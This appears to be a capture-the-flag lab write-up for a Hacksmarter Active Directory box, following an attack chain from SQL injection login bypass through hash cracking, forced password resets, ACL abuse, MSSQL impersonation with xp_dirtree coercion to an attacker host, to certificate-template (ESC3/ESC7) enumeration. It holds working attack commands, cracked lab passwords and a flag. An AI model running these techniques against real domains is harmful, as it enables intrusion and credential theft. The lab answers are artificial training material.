@@ -1,0 +1,807 @@
+---
+title: "Shadowgate2"
+description: "A well curated DC attack path from MSSQL impersonation to Administrator access"
+sidebarTitle: "Hacksmarter: Shadowgate2"
+tag: "MEDIUM"
+mode: "default"
+---
+
+<Frame>
+  ![Shadowgate](/images/shadowgate.png "Shadowgate")
+</Frame>
+
+Objective
+
+ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified, and have hired Hack Smarter to perform an internal network penetration test. Find all vulnerabilities and, if possible, elevate your privileges to Domain Admin.<br />
+
+## Initial Access
+
+You have been provided with VPN access to their network, but no other information.
+
+## **Enumeration**
+
+Document all enumeration don on the host to find vulnerable and attack paths
+
+```shellscript expandable
+nmap -Pn -sCV -sC -p- --min-rate=200 10.0.30.30 -T4 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 23:17 -0400
+Nmap scan report for 10.0.30.30
+Host is up (0.016s latency).
+Not shown: 65511 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: ShadowGate | Advanced Cyber Security Solutions
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-02 23:06:52Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.0.30.30:1433: 
+|     Target_Name: SHADOWGATE
+|     NetBIOS_Domain_Name: SHADOWGATE
+|     NetBIOS_Computer_Name: SG-DC01
+|     DNS_Domain_Name: shadowgate.local
+|     DNS_Computer_Name: SG-DC01.shadowgate.local
+|     DNS_Tree_Name: shadowgate.local
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.0.30.30:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-08-02T23:03:18
+|_Not valid after:  2056-08-02T23:03:18
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-02T23:08:31+00:00; -4h14m15s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-08-02T23:08:30+00:00; -4h14m15s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: SHADOWGATE
+|   NetBIOS_Domain_Name: SHADOWGATE
+|   NetBIOS_Computer_Name: SG-DC01
+|   DNS_Domain_Name: shadowgate.local
+|   DNS_Computer_Name: SG-DC01.shadowgate.local
+|   DNS_Tree_Name: shadowgate.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-08-02T23:07:46+00:00
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Not valid before: 2026-07-18T09:38:28
+|_Not valid after:  2027-01-17T09:38:28
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49738/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SG-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-08-02T23:07:50
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: -4h14m16s, deviation: 2s, median: -4h14m15s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 335.52 seconds
+```
+
+![Image](/images/image-16.png "Image")
+
+```shellscript expandable
+gobuster vhost -u http://shadowgate.local/ -w /usr/share/wordlists/dirb/big.txt --exclude-length 334 --append-domain
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://shadowgate.local/
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/wordlists/dirb/big.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Length:            334
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+dev.shadowgate.local Status: 200 [Size: 14924]
+Progress: 20469 / 20469 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+![Image](/images/image-17.png "Image")
+
+Using `Intruder` on `Burpsuite`. I was able to brute force the `Login Page` with SQL Injection payloads.
+
+![Image](/images/image-18.png "Image")
+
+Using the `'OR 1=1--'` SQL Injection payload I was able to login as the `mitch.r `user.
+
+![Image](/images/image-19.png "Image")
+
+![Image](/images/image-20.png "Image")
+
+![Image](/images/image-21.png "Image")
+
+```shellscript
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mitch.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+snitch1993       (mitch.r)     
+1g 0:00:00:02 DONE (2026-08-03 00:59) 0.4975g/s 1823Kp/s 1823Kc/s 1823KC/s snoedrop..snickers49
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+```shellscript
+nxc smb 10.0.30.30 -u 'mitch.r' -p 'snitch1993'       
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\mitch.r:snitch1993 
+
+
+➜  Shadowgate2 nxc smb 10.0.30.30 -u 'mitch.r' -p 'snitch1993' --shares
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\mitch.r:snitch1993 
+SMB         10.0.30.30      445    SG-DC01          [*] Enumerated shares
+SMB         10.0.30.30      445    SG-DC01          Share           Permissions            Remark
+SMB         10.0.30.30      445    SG-DC01          -----           -----------            ------
+SMB         10.0.30.30      445    SG-DC01          ADMIN$                                 Remote Admin
+SMB         10.0.30.30      445    SG-DC01          C$                                     Default share
+SMB         10.0.30.30      445    SG-DC01          dev$            READ,WRITE             
+SMB         10.0.30.30      445    SG-DC01          IPC$            READ                   Remote IPC
+SMB         10.0.30.30      445    SG-DC01          NETLOGON        READ                   Logon server share 
+SMB         10.0.30.30      445    SG-DC01          SYSVOL          READ                   Logon server share
+```
+
+#### **Bloodhound**
+
+```shellscript
+bloodyad --host 10.0.30.30 -d shadowgate.local -u mitch.r -p 'snitch1993' get bloodhound
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 30.91it/s]
+Generating lookuptable: 86it [00:00, 376.29it/s]
+Dumping SDs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 90/90 [00:01<00:00, 55.19it/s]
+Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 15.34it/s]
+Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:00<00:00, 338.46it/s]
+Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 44.35it/s]
+Dumping groups: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00<00:00, 1075.65it/s]
+Dumping GPOs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 111.89it/s]
+Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 54.49it/s]
+Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 364.64it/s]
+[+] Bloodhound data saved to 20260803T050746_Bloodhound.zip
+[+] Found 0 trusts
+```
+
+`mitch.r` has both `ForceChangePassword` on both `milo.w` and `ryan.j`. `Milo.w` is a better attack path because he also has an `outbound Object Control` over the `svc_mssql` user.
+
+![Image](/images/image-22.png "Image")
+
+```shellscript
+net rpc password "milo.w" "newP@ssword2022" -U "shadowgate.local"/"mitch.r"%"snitch1993" -S "10.0.30.30"
+
+ 
+➜  Shadowgate2 nxc smb 10.0.30.30 -u 'milo.w' -p 'newP@ssword2022'
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\milo.w:newP@ssword2022
+```
+
+![Image](/images/image-23.png "Image")
+
+```shellscript
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' set owner svc_mssql 'milo.w'        
+[+] Old owner S-1-5-21-2396436576-3267128377-3646372360-512 is now replaced by milo.w on svc_mssql
+
+# Give milo.w GenericAll Rights
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' add genericAll 'svc_mssql' 'milo.w'
+[+] milo.w has now GenericAll on svc_mssql
+
+# Change SVC_MSSQL password
+bloodyad --host 10.0.30.30 -d shadowgate.local -u milo.w -p 'newP@ssword2022' set password 'svc_mssql' 'Valentino1@'
+[+] Password changed successfully!
+```
+
+#### **MSSQL Impersonation**
+
+```shellscript
+nxc mssql 10.0.30.30 -u 'svc_mssql' -p 'Valentino1@' -M mssql_priv            
+MSSQL       10.0.30.30      1433   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local) (EncryptionReq:False) 
+MSSQL       10.0.30.30      1433   SG-DC01          [+] shadowgate.local\svc_mssql:Valentino1@ 
+MSSQL_PRIV  10.0.30.30      1433   SG-DC01          [*] SHADOWGATE\svc_mssql can impersonate: SHADOWGATE\bogdan.r
+```
+
+Using `impacket-mssqlclient`, it also shows `svc_mssql `can impersonate `bogdan.r`
+
+```shellscript
+impacket-mssqlclient shadowgate/svc_mssql:'Valentino1@'@10.0.30.30 -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SG-DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SHADOWGATE\svc_mssql  guest@master)> 
+SQL (SHADOWGATE\svc_mssql  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee                grantor               
+----------   --------   ---------------   ----------   --------------------   -------------------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r   
+SQL (SHADOWGATE\svc_mssql  guest@master)> 
+```
+
+```text
+SQL (SHADOWGATE\bogdan.r  guest@master)> xp_dirtree //10.200.76.171/shares
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (SHADOWGATE\bogdan.r  guest@master)> 
+```
+
+![Image](/images/image-24.png "Image")
+
+```shellscript
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt bogdan.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bogdan0126       (bogdan.r)     
+1g 0:00:00:05 DONE (2026-08-03 01:57) 0.1915g/s 1827Kp/s 1827Kc/s 1827KC/s boiadee..bog625sulk115
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+# Foothold
+
+Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box
+
+```shellscript
+nxc smb 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126'         
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\bogdan.r:bogdan0126 
+
+nxc winrm 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126'
+WINRM       10.0.30.30      5985   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local) 
+WINRM       10.0.30.30      5985   SG-DC01          [+] shadowgate.local\bogdan.r:bogdan0126 (Pwn3d!)
+```
+
+No flag on `bogdan.r `desktop, so there would be another way.
+
+```shellscript
+evil-winrm -i 10.0.30.30 -u 'bogdan.r' -p 'bogdan0126' 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bogdan.r\Documents> dir
+*Evil-WinRM* PS C:\Users\bogdan.r\Documents> cd ..
+*Evil-WinRM* PS C:\Users\bogdan.r> cd Desktop
+*Evil-WinRM* PS C:\Users\bogdan.r\Desktop> dir
+```
+
+<Frame>
+  ![Image](/images/image-25.png "Image")
+</Frame>
+
+#### **Generic-All (Force Password Change)**
+
+```shellscript
+net rpc password "oscar.m" "Valentino1@" -U "shadowgate.local"/"bogdan.r"%"bogdan0126" -S "10.0.30.30"
+
+OR
+
+bloodyad --host 10.0.30.30 -d shadowgate.local -u bogdan.r -p 'bogdan0126' set password 'oscar.m' 'Valentino1@'
+[+] Password changed successfully!
+```
+
+But I get this. `STATUS_INVALID_LOGON_HOURS`
+
+```shellscript
+nxc smb 10.0.30.30 -u 'oscar.m' -p "Valentino1@"
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [-] shadowgate.local\oscar.m:Valentino1@ STATUS_INVALID_LOGON_HOURS
+```
+
+You can clear it off using `bloodyad set object` command.
+
+```shellscript
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bogdan0126' set object oscar.m logonHours 
+[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
+[+] oscar.m's logonHours has been updated
+
+nxc smb 10.0.30.30 -u 'oscar.m' -p "Valentino1@"
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\oscar.m:Valentino1@ 
+```
+
+#### **User flag**
+
+```shellscript expandable
+evil-winrm -i 10.0.30.30 -u 'oscar.m' -p 'Valentino1@'  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oscar.m\Documents> dir
+*Evil-WinRM* PS C:\Users\oscar.m\Documents> cd ..
+*Evil-WinRM* PS C:\Users\oscar.m> cd Desktop
+*Evil-WinRM* PS C:\Users\oscar.m\Desktop> dir
+
+
+    Directory: C:\Users\oscar.m\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/4/2025   1:03 PM           6553 user.txt
+
+
+*Evil-WinRM* PS C:\Users\oscar.m\Desktop> type user.txt
+
+FLAG[shadowgate_user_integrity_breach_7f2c]
+```
+
+#### **Writable Objects**
+
+```shellscript expandable
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' get writable --detail 
+
+distinguishedName: CN=Users,DC=shadowgate,DC=local
+user: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=shadowgate,DC=local
+url: WRITE
+wWWHomePage: WRITE
+
+distinguishedName: CN=oscar.m,CN=Users,DC=shadowgate,DC=local
+thumbnailPhoto: WRITE
+pager: WRITE
+mobile: WRITE
+homePhone: WRITE
+userSMIMECertificate: WRITE
+
+<< snip >>
+
+
+distinguishedName: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
+ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
+nTFRSSubscriptions: CREATE_CHILD
+classStore: CREATE_CHILD
+ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
+
+<< snip >>
+
+distinguishedName: DC=shadowgate.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=shadowgate,DC=local
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.shadowgate.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=shadowgate,DC=local
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+```
+
+#### **Restored deleted Object**
+
+```shellscript
+Shadowgate2 bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' set restore sam.h          
+[+] sam.h has been restored successfully under CN=sam.h,CN=Users,DC=shadowgate,DC=local
+```
+
+#### **Change Password for Recovered User**
+
+```shellscript
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Valentino1@' set password 'sam.h' 'Valentino1@'
+[+] Password changed successfully!
+```
+
+### **BloodHound Data for Sam.h (Recovered User)**
+
+```shellscript
+bloodyad --host SG-DC01.shadowgate.local -d shadowgate.local -u sam.h -p 'Valentino1@' get bloodhound               
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 30.40it/s]
+Generating lookuptable: 87it [00:00, 419.43it/s]
+Dumping SDs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████| 91/91 [00:01<00:00, 56.34it/s]
+Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 19.18it/s]
+Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:00<00:00, 344.15it/s]
+Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 48.31it/s]
+Dumping groups: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00<00:00, 1058.62it/s]
+Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 87.15it/s]
+Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 59.78it/s]
+Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 384.08it/s]
+[+] Bloodhound data saved to 20260803T065050_Bloodhound.zip
+[+] Found 0 trusts
+```
+
+<Frame>
+  ![Image](/images/image-26.png "Image")
+</Frame>
+
+```shellscript expandable
+certipy-ad find -u 'sam.h@shadowgate.local' -p 'Valentino1@' -dc-ip 10.0.30.30 -target SG-DC01.shadowgate.local -vulnerable -debug -ldap-scheme ldap  
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SG-DC01.shadowgate.local'
+[+] Target IP: '10.0.30.30'
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: True (LDAP signing: True, SSL: False)
+[+] Using channel binding signing: False (LDAP channel binding: True, SSL: False)
+[+] LDAP NTLM authentication successful
+[+] Bound to ldap://10.0.30.30:389 - cleartext
+[+] Default path: DC=shadowgate,DC=local
+[+] Configuration path: CN=Configuration,DC=shadowgate,DC=local
+[+] Adding 'Domain Users' and 'Domain Computers' to list of current user's SIDs
+[+] User 'SAM.H' has 6 SIDs:
+[+]   S-1-5-21-2396436576-3267128377-3646372360-1114
+[+]   S-1-5-11
+[+]   S-1-5-32-545
+[+]   S-1-5-21-2396436576-3267128377-3646372360-513
+[+]   S-1-5-21-2396436576-3267128377-3646372360-515
+[+]   S-1-1-0
+[+] List of current user's SIDs:
+     SHADOWGATE.LOCAL\sam.h (S-1-5-21-2396436576-3267128377-3646372360-1114)
+     SHADOWGATE.LOCAL\Authenticated Users (SHADOWGATE.LOCAL-S-1-5-11)
+     SHADOWGATE.LOCAL\Users (SHADOWGATE.LOCAL-S-1-5-32-545)
+     SHADOWGATE.LOCAL\Domain Users (S-1-5-21-2396436576-3267128377-3646372360-513)
+     SHADOWGATE.LOCAL\Domain Computers (S-1-5-21-2396436576-3267128377-3646372360-515)
+     SHADOWGATE.LOCAL\Everyone (SHADOWGATE.LOCAL-S-1-1-0)
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[*] Retrieving CA configuration for 'Shadowgate-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[+] Connected to remote registry at 'SG-DC01.shadowgate.local' ('10.0.30.30')
+[*] Successfully retrieved CA configuration for 'Shadowgate-CA'
+[*] Checking web enrollment for CA 'Shadowgate-CA' @ 'SG-DC01.shadowgate.local'
+[+] Resolved 'SG-DC01.shadowgate.local' from cache: 10.0.30.30
+[+] Connecting to 'http://10.0.30.30/certsrv/'
+[+] Resolved 'SG-DC01.shadowgate.local' from cache: 10.0.30.30
+[+] Connecting to 'https://10.0.30.30/certsrv/'
+[!] Error checking web enrollment: timed out
+
+httpx.ConnectTimeout: timed out
+[*] Saving text output to '20260803031632_Certipy.txt'
+[+] Attempting to write data to '20260803031632_Certipy.txt'
+[+] Data written to '20260803031632_Certipy.txt'
+[*] Wrote text output to '20260803031632_Certipy.txt'
+[*] Saving JSON output to '20260803031632_Certipy.json'
+[+] Attempting to write data to '20260803031632_Certipy.json'
+[+] Data written to '20260803031632_Certipy.json'
+[*] Wrote JSON output to '20260803031632_Certipy.json'
+```
+
+Both vulnerable to `ESC7` and `ESC3.`
+
+```shellscript expandable
+cat 20260803031632_Certipy.json          
+{
+  "Certificate Authorities": {
+    "0": {
+      "CA Name": "Shadowgate-CA",
+      "DNS Name": "SG-DC01.shadowgate.local",
+      "Certificate Subject": "CN=Shadowgate-CA, DC=shadowgate, DC=local",
+      "Certificate Serial Number": "3DADB967D3C30DB94A9620C07D4332B0",
+      "Certificate Validity Start": "2025-12-07 17:37:04+00:00",
+      "Certificate Validity End": "2124-12-07 17:47:04+00:00",
+      "Web Enrollment": {
+        "http": {
+          "enabled": false
+        },
+        "https": {
+          "enabled": false,
+          "channel_binding": null
+        }
+      },
+      "User Specified SAN": "Disabled",
+      "Request Disposition": "Issue",
+      "Enforce Encryption for Requests": "Enabled",
+      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
+      "Permissions": {
+        "Owner": "SHADOWGATE.LOCAL\\Administrators",
+        "Access Rights": {
+          "512": [
+            "SHADOWGATE.LOCAL\\Authenticated Users",
+            "SHADOWGATE.LOCAL\\sam.h"
+          ],
+          "1": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins",
+            "SHADOWGATE.LOCAL\\Administrators",
+            "SHADOWGATE.LOCAL\\sam.h"
+          ],
+          "2": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins",
+            "SHADOWGATE.LOCAL\\Administrators"
+          ],
+          "256": [
+            "SHADOWGATE.LOCAL\\sam.h"
+          ]
+        }
+      },
+      "[+] User Enrollable Principals": [
+        "SHADOWGATE.LOCAL\\Authenticated Users",
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[+] User ACL Principals": [
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[!] Vulnerabilities": {
+        "ESC7": "User has dangerous permissions."
+      }
+    }
+  },
+  "Certificate Templates": {
+    "0": {
+      "Template Name": "Shadowgate-EnrollmentAgent",
+      "Display Name": "Shadowgate-EnrollmentAgent",
+      "Certificate Authorities": [
+        "Shadowgate-CA"
+      ],
+      "Enabled": true,
+      "Client Authentication": false,
+      "Enrollment Agent": true,
+      "Any Purpose": false,
+      "Enrollee Supplies Subject": false,
+      "Certificate Name Flag": [
+        33554432,
+        2147483648
+      ],
+      "Enrollment Flag": [
+        32
+      ],
+      "Private Key Flag": [
+        16
+      ],
+      "Extended Key Usage": [
+        "Certificate Request Agent"
+      ],
+      "Requires Manager Approval": false,
+      "Requires Key Archival": false,
+      "Authorized Signatures Required": 0,
+      "Schema Version": 2,
+      "Validity Period": "2 years",
+      "Renewal Period": "6 weeks",
+      "Minimum RSA Key Length": 2048,
+      "Template Created": "2025-12-07 17:51:15+00:00",
+      "Template Last Modified": "2025-12-07 17:51:19+00:00",
+      "Permissions": {
+        "Enrollment Permissions": {
+          "Enrollment Rights": [
+            "SHADOWGATE.LOCAL\\sam.h",
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ]
+        },
+        "Object Control Permissions": {
+          "Owner": "SHADOWGATE.LOCAL\\Administrator",
+          "Full Control Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Owner Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Dacl Principals": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ],
+          "Write Property Enroll": [
+            "SHADOWGATE.LOCAL\\Domain Admins",
+            "SHADOWGATE.LOCAL\\Enterprise Admins"
+          ]
+        }
+      },
+      "[+] User Enrollable Principals": [
+        "SHADOWGATE.LOCAL\\sam.h"
+      ],
+      "[!] Vulnerabilities": {
+        "ESC3": "Template has Certificate Request Agent EKU set."
+      }
+    }
+  }
+}% 
+```
+
+If you are having issues use `-k.`
+
+```shellscript
+certipy-ad req \       
+    -u 'sam.h@shadowgate.local' -p 'Valentino1@' \
+    -dc-ip '10.0.30.30' -target 'SG-DC01.shadowgate.local' \
+    -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent' -ldap-scheme ldap -debug -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
